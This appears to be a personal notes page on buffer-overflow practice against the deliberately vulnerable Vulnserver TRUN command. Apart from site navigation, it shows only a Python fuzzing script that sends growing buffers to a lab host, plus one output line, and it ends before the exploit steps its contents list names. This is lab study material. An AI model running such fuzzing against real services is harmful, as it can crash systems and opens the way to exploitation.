<!doctype html><html lang=en class="js csstransforms3d"><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.80.0"><meta name=description content="Notes from the TRUN command on the Vulnserver machine."><meta name=author content="Justin Perdok"><link rel=icon href=/images/favicon.png type=image/png><title>TRUN :: My notes and snippets</title><link href=/css/nucleus.css rel=stylesheet><link href=/css/fontawesome-all.min.css rel=stylesheet><link href=/css/hybrid.css rel=stylesheet><link href=/css/featherlight.min.css rel=stylesheet><link href=/css/perfect-scrollbar.min.css rel=stylesheet><link href=/css/auto-complete.css rel=stylesheet><link href=/css/atom-one-dark-reasonable.css rel=stylesheet><link href=/css/theme.css rel=stylesheet><link href=/css/hugo-theme.css rel=stylesheet><link href=/css/theme-darkblue.css rel=stylesheet><script src=/js/jquery-3.3.1.min.js></script><style>:root #header+#content>#left>#rlblock_left{display:none!important}</style></head><body data-url=/notes/ctfs/vulnserver/trun/><nav id=sidebar><div id=header-wrapper><div id=header><a id=logo href=https://dev-hugo.justin-p.me/></a></div><div class=searchbox><label for=search-by><i class="fas fa-search"></i></label><input data-search-input id=search-by type=search placeholder=Search...>
<span data-search-clear><i class="fas fa-times"></i></span></div><script type=text/javascript src=/js/lunr.min.js></script><script type=text/javascript src=/js/auto-complete.js></script><script type=text/javascript>var baseurl="https:\/\/dev-hugo.justin-p.me\/";</script><script type=text/javascript src=/js/search.js></script></div><div class=highlightable><ul class=topics><li data-nav-id=/cheat-cheets/ title=Commands class=dd-item><a href=/cheat-cheets/><i class="fas fa-keyboard"></i>Commands</a><ul><li data-nav-id=/cheat-cheets/programming/ title=Programming class=dd-item><a href=/cheat-cheets/programming/><i class="fas fa-code"></i>Programming</a><ul><li data-nav-id=/cheat-cheets/programming/bash/ title=Bash class=dd-item><a href=/cheat-cheets/programming/bash/><i class="fas fa-layer-group"></i>Bash</a></li><li data-nav-id=/cheat-cheets/programming/docker-compose/ title=Docker-Compose class=dd-item><a href=/cheat-cheets/programming/docker-compose/><i class="fas fa-layer-group"></i>Docker-Compose</a></li><li data-nav-id=/cheat-cheets/programming/dockerfile/ title=Dockerfile class=dd-item><a href=/cheat-cheets/programming/dockerfile/><i class="fas fa-layer-group"></i>Dockerfile</a></li><li data-nav-id=/cheat-cheets/programming/markdown/ title=Markdown class=dd-item><a href=/cheat-cheets/programming/markdown/><i class="fas fa-layer-group"></i>Markdown</a></li><li data-nav-id=/cheat-cheets/programming/mysql/ title=MySQL class=dd-item><a href=/cheat-cheets/programming/mysql/><i class="fas fa-layer-group"></i>MySQL</a></li><li data-nav-id=/cheat-cheets/programming/python/ title=Python class=dd-item><a href=/cheat-cheets/programming/python/><i class="fas fa-layer-group"></i>Python</a></li></ul></li><li data-nav-id=/cheat-cheets/tools/ title=Tools class=dd-item><a href=/cheat-cheets/tools/><i class="fas fa-tools"></i>Tools</a><ul><li data-nav-id=/cheat-cheets/tools/00-c2-frameworks/ title="'C2 Frameworks'" class=dd-item><a href=/cheat-cheets/tools/00-c2-frameworks/><i class="fas fa-folder"></i>C2 Frameworks</a><ul><li data-nav-id=/cheat-cheets/tools/00-c2-frameworks/empire/ title=Empire class=dd-item><a href=/cheat-cheets/tools/00-c2-frameworks/empire/><i class="fas fa-wrench"></i>Empire</a></li><li data-nav-id=/cheat-cheets/tools/00-c2-frameworks/metasploit/ title=Metasploit class=dd-item><a href=/cheat-cheets/tools/00-c2-frameworks/metasploit/><i class="fas fa-wrench"></i>Metasploit</a></li></ul></li><li data-nav-id=/cheat-cheets/tools/00-forensic/ title="'Forensic'" class=dd-item><a href=/cheat-cheets/tools/00-forensic/><i class="fas fa-folder"></i>Forensic</a><ul><li data-nav-id=/cheat-cheets/tools/00-forensic/exiftool/ title=exiftool class=dd-item><a href=/cheat-cheets/tools/00-forensic/exiftool/><i class="fas fa-wrench"></i>exiftool</a></li><li data-nav-id=/cheat-cheets/tools/00-forensic/ssh-sha256-to-public-key/ title="ssh sha256 to public key" class=dd-item><a href=/cheat-cheets/tools/00-forensic/ssh-sha256-to-public-key/><i class="fas fa-wrench"></i>ssh sha256 to public key</a></li><li data-nav-id=/cheat-cheets/tools/00-forensic/usbrip/ title=usbrip class=dd-item><a href=/cheat-cheets/tools/00-forensic/usbrip/><i class="fas fa-wrench"></i>usbrip</a></li></ul></li><li data-nav-id=/cheat-cheets/tools/00-steganography/ title="'Steganography'" class=dd-item><a href=/cheat-cheets/tools/00-steganography/><i class="fas fa-folder"></i>Steganography</a><ul><li data-nav-id=/cheat-cheets/tools/00-steganography/binwalk/ title=binwalk class=dd-item><a href=/cheat-cheets/tools/00-steganography/binwalk/><i class="fas fa-wrench"></i>binwalk</a></li><li data-nav-id=/cheat-cheets/tools/00-steganography/foremost/ title=foremost class=dd-item><a href=/cheat-cheets/tools/00-steganography/foremost/><i class="fas fa-wrench"></i>foremost</a></li><li data-nav-id=/cheat-cheets/tools/00-steganography/steghide/ title=steghide class=dd-item><a href=/cheat-cheets/tools/00-steganography/steghide/><i class="fas fa-wrench"></i>steghide</a></li></ul></li><li data-nav-id=/cheat-cheets/tools/amass/ title=amass class=dd-item><a href=/cheat-cheets/tools/amass/><i class="fas fa-wrench"></i>amass</a></li><li data-nav-id=/cheat-cheets/tools/h8mail/ title=h8mail class=dd-item><a href=/cheat-cheets/tools/h8mail/><i class="fas fa-wrench"></i>h8mail</a></li><li data-nav-id=/cheat-cheets/tools/hash-identifier/ title="hash identifier" class=dd-item><a href=/cheat-cheets/tools/hash-identifier/><i class="fas fa-wrench"></i>hash identifier</a></li><li data-nav-id=/cheat-cheets/tools/hashcat/ title=hashcat class=dd-item><a href=/cheat-cheets/tools/hashcat/><i class="fas fa-wrench"></i>hashcat</a></li><li data-nav-id=/cheat-cheets/tools/hydra/ title=Hydra class=dd-item><a href=/cheat-cheets/tools/hydra/><i class="fas fa-wrench"></i>Hydra</a></li><li data-nav-id=/cheat-cheets/tools/mitm6/ title=mitm6 class=dd-item><a href=/cheat-cheets/tools/mitm6/><i class="fas fa-wrench"></i>mitm6</a></li><li data-nav-id=/cheat-cheets/tools/msfvenom/ title=msfvenom class=dd-item><a href=/cheat-cheets/tools/msfvenom/><i class="fas fa-wrench"></i>msfvenom</a></li><li data-nav-id=/cheat-cheets/tools/nc/ title=nc class=dd-item><a href=/cheat-cheets/tools/nc/><i class="fas fa-wrench"></i>nc</a></li><li data-nav-id=/cheat-cheets/tools/nmap/ title=Nmap class=dd-item><a href=/cheat-cheets/tools/nmap/><i class="fas fa-wrench"></i>Nmap</a></li><li data-nav-id=/cheat-cheets/tools/ntlmrelayx/ title=ntlmrelayx class=dd-item><a href=/cheat-cheets/tools/ntlmrelayx/><i class="fas fa-wrench"></i>ntlmrelayx</a></li><li data-nav-id=/cheat-cheets/tools/openssl/ title=openssl class=dd-item><a href=/cheat-cheets/tools/openssl/><i class="fas fa-wrench"></i>openssl</a><ul><li data-nav-id=/cheat-cheets/tools/openssl/s_client/ title=s_client class=dd-item><a href=/cheat-cheets/tools/openssl/s_client/><i class="fas fa-wrench"></i>s_client</a></li></ul></li><li data-nav-id=/cheat-cheets/tools/psdnsdumpsterapi/ title=PSDNSDumpsterAPI class=dd-item><a href=/cheat-cheets/tools/psdnsdumpsterapi/><i class="fas fa-wrench"></i>PSDNSDumpsterAPI</a></li><li data-nav-id=/cheat-cheets/tools/psexec/ title=psexec class=dd-item><a href=/cheat-cheets/tools/psexec/><i class="fas fa-wrench"></i>psexec</a></li><li data-nav-id=/cheat-cheets/tools/responder/ title=responder class=dd-item><a href=/cheat-cheets/tools/responder/><i class="fas fa-wrench"></i>responder</a></li><li data-nav-id=/cheat-cheets/tools/searchsploit/ title=searchsploit class=dd-item><a href=/cheat-cheets/tools/searchsploit/><i class="fas fa-wrench"></i>searchsploit</a></li><li data-nav-id=/cheat-cheets/tools/sublist3r/ title=sublist3r class=dd-item><a href=/cheat-cheets/tools/sublist3r/><i class="fas fa-wrench"></i>sublist3r</a></li><li data-nav-id=/cheat-cheets/tools/theharvester/ title=theHarvester class=dd-item><a href=/cheat-cheets/tools/theharvester/><i class="fas fa-wrench"></i>theHarvester</a></li><li data-nav-id=/cheat-cheets/tools/whatweb/ title=whatweb class=dd-item><a href=/cheat-cheets/tools/whatweb/><i class="fas fa-wrench"></i>whatweb</a></li></ul></li><li data-nav-id=/cheat-cheets/unix/ title=Unix class=dd-item><a href=/cheat-cheets/unix/><i class="fab fa-linux"></i>Unix</a><ul><li data-nav-id=/cheat-cheets/unix/awk/ title=awk class=dd-item><a href=/cheat-cheets/unix/awk/><i class="fas fa-terminal"></i>awk</a></li><li data-nav-id=/cheat-cheets/unix/base64/ title=base64 class=dd-item><a href=/cheat-cheets/unix/base64/><i class="fas fa-terminal"></i>base64</a></li><li data-nav-id=/cheat-cheets/unix/bzip2/ title=bzip2 class=dd-item><a href=/cheat-cheets/unix/bzip2/><i class="fas fa-terminal"></i>bzip2</a></li><li data-nav-id=/cheat-cheets/unix/cron/ title=cron class=dd-item><a href=/cheat-cheets/unix/cron/><i class="fas fa-terminal"></i>cron</a></li><li data-nav-id=/cheat-cheets/unix/curl/ title=curl class=dd-item><a href=/cheat-cheets/unix/curl/><i class="fas fa-terminal"></i>curl</a></li><li data-nav-id=/cheat-cheets/unix/cut/ title=cut class=dd-item><a href=/cheat-cheets/unix/cut/><i class="fas fa-terminal"></i>cut</a></li><li data-nav-id=/cheat-cheets/unix/file/ title=file class=dd-item><a href=/cheat-cheets/unix/file/><i class="fas fa-terminal"></i>file</a></li><li data-nav-id=/cheat-cheets/unix/find/ title=find class=dd-item><a href=/cheat-cheets/unix/find/><i class="fas fa-terminal"></i>find</a></li><li data-nav-id=/cheat-cheets/unix/grep/ title=grep class=dd-item><a href=/cheat-cheets/unix/grep/><i class="fas fa-terminal"></i>grep</a></li><li data-nav-id=/cheat-cheets/unix/gzip-gunzip-zcat/ title="gzip gunzip zcat" class=dd-item><a href=/cheat-cheets/unix/gzip-gunzip-zcat/><i class="fas fa-terminal"></i>gzip gunzip zcat</a></li><li data-nav-id=/cheat-cheets/unix/md5sum/ title=md5sum class=dd-item><a href=/cheat-cheets/unix/md5sum/><i class="fas fa-terminal"></i>md5sum</a></li><li data-nav-id=/cheat-cheets/unix/random/ title=random class=dd-item><a href=/cheat-cheets/unix/random/><i class="fas fa-terminal"></i>random</a></li><li data-nav-id=/cheat-cheets/unix/rev/ title=rev class=dd-item><a href=/cheat-cheets/unix/rev/><i class="fas fa-terminal"></i>rev</a></li><li data-nav-id=/cheat-cheets/unix/scp/ title=scp class=dd-item><a href=/cheat-cheets/unix/scp/><i class="fas fa-terminal"></i>scp</a></li><li data-nav-id=/cheat-cheets/unix/sed/ title=sed class=dd-item><a href=/cheat-cheets/unix/sed/><i class="fas fa-terminal"></i>sed</a></li><li data-nav-id=/cheat-cheets/unix/showmount/ title=showmount class=dd-item><a href=/cheat-cheets/unix/showmount/><i class="fas fa-terminal"></i>showmount</a></li><li data-nav-id=/cheat-cheets/unix/sort/ title=sort class=dd-item><a href=/cheat-cheets/unix/sort/><i class="fas fa-terminal"></i>sort</a></li><li data-nav-id=/cheat-cheets/unix/strings/ title=strings class=dd-item><a href=/cheat-cheets/unix/strings/><i class="fas fa-terminal"></i>strings</a></li><li data-nav-id=/cheat-cheets/unix/tar/ title=tar class=dd-item><a href=/cheat-cheets/unix/tar/><i class="fas fa-terminal"></i>tar</a></li><li data-nav-id=/cheat-cheets/unix/tmux/ title=tmux class=dd-item><a href=/cheat-cheets/unix/tmux/><i class="fas fa-terminal"></i>tmux</a></li><li data-nav-id=/cheat-cheets/unix/touch/ title=touch class=dd-item><a href=/cheat-cheets/unix/touch/><i class="fas fa-terminal"></i>touch</a></li><li data-nav-id=/cheat-cheets/unix/tr/ title=tr class=dd-item><a href=/cheat-cheets/unix/tr/><i class="fas fa-terminal"></i>tr</a></li><li data-nav-id=/cheat-cheets/unix/uniq/ title=uniq class=dd-item><a href=/cheat-cheets/unix/uniq/><i class="fas fa-terminal"></i>uniq</a></li><li data-nav-id=/cheat-cheets/unix/xxd/ title=xxd class=dd-item><a href=/cheat-cheets/unix/xxd/><i class="fas fa-terminal"></i>xxd</a></li></ul></li></ul></li><li data-nav-id=/guides/ title=Guides class=dd-item><a href=/guides/><i class="fas fa-arrow-alt-circle-right"></i>Guides</a><ul><li data-nav-id=/guides/ubuntu-vps/ title="Ubuntu VPS" class=dd-item><a href=/guides/ubuntu-vps/><i class="fab fa-ubuntu"></i>Ubuntu VPS</a><ul><li data-nav-id=/guides/ubuntu-vps/00-intro/ title="00. Introduction" class=dd-item><a href=/guides/ubuntu-vps/00-intro/>00. Introduction</a></li><li data-nav-id=/guides/ubuntu-vps/01-users/ title="01. Adding users" class=dd-item><a href=/guides/ubuntu-vps/01-users/>01. Adding users</a></li><li data-nav-id=/guides/ubuntu-vps/02-packges/ title="02. Managing of packages" class=dd-item><a href=/guides/ubuntu-vps/02-packges/>02. Managing of packages</a></li><li data-nav-id=/guides/ubuntu-vps/03-vim/ title="03. File editor: vim" class=dd-item><a href=/guides/ubuntu-vps/03-vim/>03. File editor: vim</a></li><li data-nav-id=/guides/ubuntu-vps/04-ufw/ title="04. UFW" class=dd-item><a href=/guides/ubuntu-vps/04-ufw/>04. UFW</a></li><li data-nav-id=/guides/ubuntu-vps/05-ssh-keys/ title="05. SSH Keys" class=dd-item><a href=/guides/ubuntu-vps/05-ssh-keys/>05. SSH Keys</a></li><li data-nav-id=/guides/ubuntu-vps/06-setup-sshd/ title="06. Setup sshd" class=dd-item><a href=/guides/ubuntu-vps/06-setup-sshd/>06. Setup sshd</a></li><li data-nav-id=/guides/ubuntu-vps/07-unattended-upgrades/ title="07. Unattended Upgrades" class=dd-item><a href=/guides/ubuntu-vps/07-unattended-upgrades/>07. Unattended Upgrades</a></li><li data-nav-id=/guides/ubuntu-vps/08-fail2ban/ title="08. Fail2ban" class=dd-item><a href=/guides/ubuntu-vps/08-fail2ban/>08. Fail2ban</a></li><li data-nav-id=/guides/ubuntu-vps/09-logwatch/ title="09. Logwatch" class=dd-item><a href=/guides/ubuntu-vps/09-logwatch/>09. Logwatch</a></li><li data-nav-id=/guides/ubuntu-vps/10-sysctl-optimization/ title="10. Sysctl Optimization" class=dd-item><a href=/guides/ubuntu-vps/10-sysctl-optimization/>10. Sysctl Optimization</a></li></ul></li></ul></li><li data-nav-id=/notes/ title=Notes class="dd-item
parent"><a href=/notes/><i class="fas fa-book-reader"></i>Notes</a><ul><li data-nav-id=/notes/courses/ title=Courses class=dd-item><a href=/notes/courses/><i class="fas fa-school"></i>Courses</a><ul><li data-nav-id=/notes/courses/blackhat-python/ title="Blackhat Python" class=dd-item><a href=/notes/courses/blackhat-python/><i class="fas fa-folder"></i>Blackhat Python</a></li><li data-nav-id=/notes/courses/breaching-the-cloud/ title="Breaching The Cloud" class=dd-item><a href=/notes/courses/breaching-the-cloud/><i class="fas fa-folder"></i>Breaching The Cloud</a></li><li data-nav-id=/notes/courses/python4n00bs/ title=Python4N00bs class=dd-item><a href=/notes/courses/python4n00bs/><i class="fas fa-folder"></i>Python4N00bs</a></li><li data-nav-id=/notes/courses/the-cyber-mentor/ title="The Cyber Mentor" class=dd-item><a href=/notes/courses/the-cyber-mentor/><i class="fas fa-folder"></i>The Cyber Mentor</a></li></ul></li><li data-nav-id=/notes/ctfs/ title=CTFs class="dd-item
parent"><a href=/notes/ctfs/><i class="fas fa-flag"></i>CTFs</a><ul><li data-nav-id=/notes/ctfs/graficomspoorzoeker/ title="Graficom Spoorzoeker" class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/><i class="fas fa-folder"></i>Graficom Spoorzoeker</a><ul><li data-nav-id=/notes/ctfs/graficomspoorzoeker/challanges/ title=Challanges class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/challanges/><i class="fas fa-question-circle"></i>Challanges</a></li><li data-nav-id=/notes/ctfs/graficomspoorzoeker/solutions/ title=Solutions class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/solutions/><i class="fas fa-check-circle"></i>Solutions</a></li></ul></li><li data-nav-id=/notes/ctfs/htb/ title=HTB class=dd-item><a href=/notes/ctfs/htb/><i class="fas fa-folder"></i>HTB</a><ul><li data-nav-id=/notes/ctfs/htb/bashed/ title=Bashed class=dd-item><a href=/notes/ctfs/htb/bashed/><i class="fas fa-server"></i>Bashed</a></li><li data-nav-id=/notes/ctfs/htb/blue/ title=Blue class=dd-item><a href=/notes/ctfs/htb/blue/><i class="fas fa-server"></i>Blue</a></li><li data-nav-id=/notes/ctfs/htb/devel/ title=Devel class=dd-item><a href=/notes/ctfs/htb/devel/><i class="fas fa-server"></i>Devel</a></li><li data-nav-id=/notes/ctfs/htb/grandpa/ title=Grandpa class=dd-item><a href=/notes/ctfs/htb/grandpa/><i class="fas fa-server"></i>Grandpa</a></li><li data-nav-id=/notes/ctfs/htb/granny/ title=Granny class=dd-item><a href=/notes/ctfs/htb/granny/><i class="fas fa-server"></i>Granny</a></li><li data-nav-id=/notes/ctfs/htb/jerry/ title=Jerry class=dd-item><a href=/notes/ctfs/htb/jerry/><i class="fas fa-server"></i>Jerry</a></li><li data-nav-id=/notes/ctfs/htb/lame/ title=Lame class=dd-item><a href=/notes/ctfs/htb/lame/><i class="fas fa-server"></i>Lame</a></li><li data-nav-id=/notes/ctfs/htb/legacy/ title=Legacy class=dd-item><a href=/notes/ctfs/htb/legacy/><i class="fas fa-server"></i>Legacy</a></li><li data-nav-id=/notes/ctfs/htb/metmon/ title=Netmon class=dd-item><a href=/notes/ctfs/htb/metmon/><i class="fas fa-server"></i>Netmon</a></li><li data-nav-id=/notes/ctfs/htb/nibbles/ title=Nibbles class=dd-item><a href=/notes/ctfs/htb/nibbles/><i class="fas fa-server"></i>Nibbles</a></li><li data-nav-id=/notes/ctfs/htb/optimum/ title=Optimum class=dd-item><a href=/notes/ctfs/htb/optimum/><i class="fas fa-server"></i>Optimum</a></li></ul></li><li data-nav-id=/notes/ctfs/overthewire/ title=OverTheWire class=dd-item><a href=/notes/ctfs/overthewire/><i class="fas fa-folder"></i>OverTheWire</a><ul><li data-nav-id=/notes/ctfs/overthewire/bandit/ title=Bandit class=dd-item><a href=/notes/ctfs/overthewire/bandit/><i class="fas fa-layer-group"></i>Bandit</a></li><li data-nav-id=/notes/ctfs/overthewire/natasa/ title=Natasa class=dd-item><a href=/notes/ctfs/overthewire/natasa/><i class="fas fa-layer-group"></i>Natasa</a></li></ul></li><li data-nav-id=/notes/ctfs/underthewire/ title=underthewire class=dd-item><a href=/notes/ctfs/underthewire/><i class="fas fa-folder"></i>underthewire</a><ul><li data-nav-id=/notes/ctfs/underthewire/century/ title=century class=dd-item><a href=/notes/ctfs/underthewire/century/><i class="fas fa-folder"></i>century</a></li><li data-nav-id=/notes/ctfs/underthewire/cyborg/ title=cyborg class=dd-item><a href=/notes/ctfs/underthewire/cyborg/><i class="fas fa-folder"></i>cyborg</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnhub/ title=VulnHub class=dd-item><a href=/notes/ctfs/vulnhub/><i class="fas fa-folder"></i>VulnHub</a><ul><li data-nav-id=/notes/ctfs/vulnhub/fristileaks/ title=Fristileaks class=dd-item><a href=/notes/ctfs/vulnhub/fristileaks/><i class="fas fa-folder"></i>Fristileaks</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/ title=Kioptrix class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/><i class="fas fa-folder"></i>Kioptrix</a><ul><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level1/ title="Level 1" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level1/><i class="fas fa-layer-group"></i>Level 1</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level2/ title="Level 2" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level2/><i class="fas fa-layer-group"></i>Level 2</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level3/ title="Level 3" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level3/><i class="fas fa-layer-group"></i>Level 3</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level4/ title="Level 4" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level4/><i class="fas fa-layer-group"></i>Level 4</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnhub/pwnlab/ title=Pwnlab class=dd-item><a href=/notes/ctfs/vulnhub/pwnlab/><i class="fas fa-folder"></i>Pwnlab</a></li><li data-nav-id=/notes/ctfs/vulnhub/stapler/ title=Stapler class=dd-item><a href=/notes/ctfs/vulnhub/stapler/><i class="fas fa-folder"></i>Stapler</a></li><li data-nav-id=/notes/ctfs/vulnhub/vulnix/ title=Vulnix class=dd-item><a href=/notes/ctfs/vulnhub/vulnix/><i class="fas fa-folder"></i>Vulnix</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnserver/ title=Vulnserver class="dd-item
parent"><a href=/notes/ctfs/vulnserver/><i class="fas fa-folder"></i>Vulnserver</a><ul><li data-nav-id=/notes/ctfs/vulnserver/trun/ title=TRUN class="dd-item active"><a href=/notes/ctfs/vulnserver/trun/><i class="fas fa-layer-group"></i>TRUN</a></li></ul></li></ul></li><li data-nav-id=/notes/hacking/ title="Hacking Methodology" class=dd-item><a href=/notes/hacking/><i class="fas fa-road"></i>Hacking Methodology</a><ul><li data-nav-id=/notes/hacking/external/certificate-transparency-logs/ title="Certificate Transparency Logs" class=dd-item><a href=/notes/hacking/external/certificate-transparency-logs/>Certificate Transparency Logs</a></li><li data-nav-id=/notes/hacking/external/cloud-provider-web-servers/ title=cloud-provider-web-servers class=dd-item><a href=/notes/hacking/external/cloud-provider-web-servers/>cloud-provider-web-servers</a></li><li data-nav-id=/notes/hacking/external/credential-gathering/ title="Credential Gathering" class=dd-item><a href=/notes/hacking/external/credential-gathering/>Credential Gathering</a></li><li data-nav-id=/notes/hacking/general/password-attacks/credential-stuffing/ title="Credential Stuffing" class=dd-item><a href=/notes/hacking/general/password-attacks/credential-stuffing/>Credential Stuffing</a></li><li data-nav-id=/notes/hacking/general/port-scanning/ title="Discover Open Ports" class=dd-item><a href=/notes/hacking/general/port-scanning/>Discover Open Ports</a></li><li data-nav-id=/notes/hacking/external/dns-recon/ title="DNS Recon" class=dd-item><a href=/notes/hacking/external/dns-recon/>DNS Recon</a></li><li data-nav-id=/notes/hacking/external/user-enumeration/ title="E-Mail Gathering" class=dd-item><a href=/notes/hacking/external/user-enumeration/>E-Mail Gathering</a></li><li data-nav-id=/notes/hacking/general/crack-password-encrypted-pdf/ title="encrypted password protected pdf" class=dd-item><a href=/notes/hacking/general/crack-password-encrypted-pdf/>encrypted password protected pdf</a></li><li data-nav-id=/notes/hacking/general/crack-password-protected-zip/ title="encrypted password protected zip" class=dd-item><a href=/notes/hacking/general/crack-password-protected-zip/>encrypted password protected zip</a></li><li data-nav-id=/notes/hacking/external/google-dorking/ title="Google Dorking" class=dd-item><a href=/notes/hacking/external/google-dorking/>Google Dorking</a></li><li data-nav-id=/notes/hacking/external/identify-technologies/ title="Identify Technologies" class=dd-item><a href=/notes/hacking/external/identify-technologies/>Identify Technologies</a></li><li data-nav-id=/notes/hacking/external/misconfigured-cloud-assets/ title="Misconfigured Cloud Assets" class=dd-item><a href=/notes/hacking/external/misconfigured-cloud-assets/>Misconfigured Cloud Assets</a></li><li data-nav-id=/notes/hacking/general/password-attacks/password-spraying/ title="Password Spraying" class=dd-item><a href=/notes/hacking/general/password-attacks/password-spraying/>Password Spraying</a></li><li data-nav-id=/notes/hacking/external/phising/ title=phising class=dd-item><a href=/notes/hacking/external/phising/>phising</a></li><li data-nav-id=/notes/hacking/general/post-compermise-recon/ title="post compromise recon" class=dd-item><a href=/notes/hacking/general/post-compermise-recon/>post compromise recon</a></li><li data-nav-id=/notes/hacking/general/priv-esc/ title="priv esc" class=dd-item><a href=/notes/hacking/general/priv-esc/>priv esc</a></li><li data-nav-id=/notes/hacking/external/public-key-disclosure/ title="public key disclosure" class=dd-item><a href=/notes/hacking/external/public-key-disclosure/>public key disclosure</a></li><li data-nav-id=/notes/hacking/general/redis-exploitation/ title=Redis class=dd-item><a href=/notes/hacking/general/redis-exploitation/>Redis</a></li><li data-nav-id=/notes/hacking/general/shell-escaping/ title="shell escaping" class=dd-item><a href=/notes/hacking/general/shell-escaping/>shell escaping</a></li><li data-nav-id=/notes/hacking/external/shodan/ title=Shodan class=dd-item><a href=/notes/hacking/external/shodan/>Shodan</a></li><li data-nav-id=/notes/hacking/internal/smb/ title=smb class=dd-item><a href=/notes/hacking/internal/smb/>smb</a></li><li data-nav-id=/notes/hacking/external/social-media/ title="Social Media" class=dd-item><a href=/notes/hacking/external/social-media/>Social Media</a></li><li data-nav-id=/notes/hacking/general/sql-injection/ title="SQL Injection" class=dd-item><a href=/notes/hacking/general/sql-injection/>SQL Injection</a></li><li data-nav-id=/notes/hacking/internal/steal-access-tokens/ title="steal access tokens" class=dd-item><a href=/notes/hacking/internal/steal-access-tokens/>steal access tokens</a></li><li data-nav-id=/notes/hacking/external/web/ title=Web class=dd-item><a href=/notes/hacking/external/web/>Web</a></li><li data-nav-id=/notes/hacking/external/wordpress/wpadmin-plugin-upload/ title="wpadmin plugin upload" class=dd-item><a href=/notes/hacking/external/wordpress/wpadmin-plugin-upload/>wpadmin plugin upload</a></li></ul></li><li data-nav-id=/notes/networking/ title=Networking class=dd-item><a href=/notes/networking/><i class="fas fa-network-wired"></i>Networking</a><ul><li data-nav-id=/notes/networking/osi-model/ title="OSI Model" class=dd-item><a href=/notes/networking/osi-model/><i class="fas fa-ethernet"></i>OSI Model</a><ul><li data-nav-id=/notes/networking/osi-model/layer1/ title="Layer 1" class=dd-item><a href=/notes/networking/osi-model/layer1/><i class="fas fa-ethernet"></i>Layer 1</a></li><li data-nav-id=/notes/networking/osi-model/layer2/ title="Layer 2" class=dd-item><a href=/notes/networking/osi-model/layer2/><i class="fas fa-ethernet"></i>Layer 2</a></li><li data-nav-id=/notes/networking/osi-model/layer3/ title="Layer 3" class=dd-item><a href=/notes/networking/osi-model/layer3/><i class="fas fa-ethernet"></i>Layer 3</a></li><li data-nav-id=/notes/networking/osi-model/layer4/ title="Layer 4" class=dd-item><a href=/notes/networking/osi-model/layer4/><i class="fas fa-ethernet"></i>Layer 4</a></li><li data-nav-id=/notes/networking/osi-model/layer5/ title="Layer 5" class=dd-item><a href=/notes/networking/osi-model/layer5/><i class="fas fa-ethernet"></i>Layer 5</a></li><li data-nav-id=/notes/networking/osi-model/layer6/ title="Layer 6" class=dd-item><a href=/notes/networking/osi-model/layer6/><i class="fas fa-ethernet"></i>Layer 6</a></li><li data-nav-id=/notes/networking/osi-model/layer7/ title="Layer 7" class=dd-item><a href=/notes/networking/osi-model/layer7/><i class="fas fa-ethernet"></i>Layer 7</a></li></ul></li><li data-nav-id=/notes/networking/tcpip-model/ title="TCP/IP Model" class=dd-item><a href=/notes/networking/tcpip-model/><i class="fas fa-ethernet"></i>TCP/IP Model</a></li></ul></li><li data-nav-id=/notes/z_private/ title=Z_Private class=dd-item><a href=/notes/z_private/><i class="fas fa-lock"></i>Private</a></li></ul></li></ul><section id=shortcuts><h3>More</h3><ul><li><a class=padding href=https://github.com/justin-p/><i class="fab fa-github"></i>Github</a></li><li><a class=padding href=https://justin-p.me/><i class="fas fa-kiss-wink-heart"></i>Blog</a></li><li><a class=padding href=https://twitter.com/JustinPerdok><i class="fab fa-twitter"></i>Twitter</a></li><li><a class=padding href=https://www.linkedin.com/in/justinperdok/><i class="fab fa-linkedin-in"></i>LinkedIn</a></li></ul></section><section id=footer><p>Built with
<a href=https://github.com/matcornic/hugo-theme-learn>Hugo Learn</a>
and
<a href=https://gohugo.io/>Hugo</a></p></section></div></nav><section id=body><div id=overlay></div><div class="padding highlightable"><div><div id=top-bar><div id=breadcrumbs itemscope itemtype=http://data-vocabulary.org/Breadcrumb><span id=sidebar-toggle-span><a href=# id=sidebar-toggle data-sidebar-toggle><i class="fas fa-bars"></i></a></span><span id=toc-menu><i class="fas fa-list-alt"></i></span><span class=links><a href=/></a>> <a href=/notes/>Notes</a> > <a href=/notes/ctfs/>CTFs</a> > <a href=/notes/ctfs/vulnserver/>Vulnserver</a> > TRUN</span></div><div class=progress><div class=wrapper><nav id=TableOfContents><ul><li><a href=#trun>trun</a></li><li><a href=#fuzzing>Fuzzing</a></li><li><a href=#find-eip-offset>Find EIP Offset</a><ul><li><a href=#controlling-the-esp>Controlling the ESP</a></li></ul></li><li><a href=#finding-bad-characters>Finding Bad Characters</a></li><li><a href=#find-jmp-esp>Find JMP ESP</a></li><li><a href=#generate-shellcode>Generate Shellcode</a></li><li><a href=#exploit>Exploit</a></li></ul></nav></div></div></div></div><div id=head-tags><div class=tags><a class=tag-link href=/tags/vulnserver>Vulnserver</a></div></div><div id=body-inner><h2 id=trun>trun</h2><h2 id=fuzzing>Fuzzing</h2><pre><code class=language-python>#!/usr/bin/python

import socket,sys
from time import sleep

## Fuzzing

address = '192.168.136.130'
port    = 9999

offset  = 100

while True:
	try:
		buffer  = b&quot;&quot;         # empty byte var
		buffer += b&quot;A&quot;*offset # junk times offset
		print(f'[+] Sending buffer: {str(len(buffer))} bytes')
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((address,port))
		s.recv(1024)			
		s.send(b&quot;TRUN /.:/%s \r\n&quot; % buffer) 
		offset += 100
		sleep(1)
	except RuntimeError as Err:
		print(f'[!] Unable to connect to the application. {err}')
		sys.exit(0)
	finally:
		s.close()
</code></pre><pre><code class=language-bash>root@kali:/mnt/hgfs/_shared_folder/BO python3 trun_1.py 
[+] Sending buffer: 109 bytes
